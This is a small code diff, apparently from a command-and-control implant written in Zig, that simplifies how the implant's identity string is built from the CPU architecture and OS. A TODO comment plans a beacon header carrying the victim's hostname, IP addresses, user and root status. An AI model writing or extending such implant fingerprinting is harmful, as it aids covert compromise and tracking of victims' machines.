@@ -50,14 +50,8 @@ const State = struct {
 
     fn getImplantIdentity(allocator: std.mem.Allocator) ![]u8 {
 
-        const native_os = @import("builtin").os.tag;
-        const target = try std.zig.system.resolveTargetQuery(.{ .cpu_model = .baseline });
-        const arch_name = target.cpu.model.name;
-        var os_release = @tagName(target.os.tag);
-        if(native_os != .windows) {
-            const utsn: std.posix.utsname = std.posix.uname();
-            os_release = &utsn.release;
-        }
+        const arch_name = @tagName(@import("builtin").cpu.arch);
+        const os_release = @tagName(@import("builtin").os.tag);
 
         // TODO: Authorization: base64(ipid=arch:OS:hostname:internalIP:externalIP:currentUser:isRoot)
         const implant_id = try std.mem.join(allocator, "", &.{ arch_name, ":", os_release, });
